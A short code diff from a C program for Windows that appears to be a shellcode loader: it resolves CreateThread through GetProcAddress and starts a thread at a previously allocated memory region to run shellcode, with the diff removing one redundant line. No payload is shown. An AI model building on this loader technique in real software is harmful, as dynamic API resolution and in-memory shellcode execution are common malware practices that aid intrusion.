@@ -128,7 +128,6 @@ int main() {
 	// Create a thread to execute the shellcode
 	printf("Press Enter to create a new thread...\n");
 	getchar();
-	PVOID pCreateThread = GetProcAddress(hKern, "CreateThread");
 	fnCreateThread pCreateThreadFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateThread");
 	HANDLE hThread = pCreateThreadFunc(NULL, 0, (LPTHREAD_START_ROUTINE)hVirtualAlloc, NULL, 0, NULL);
 	if (hThread == NULL) {
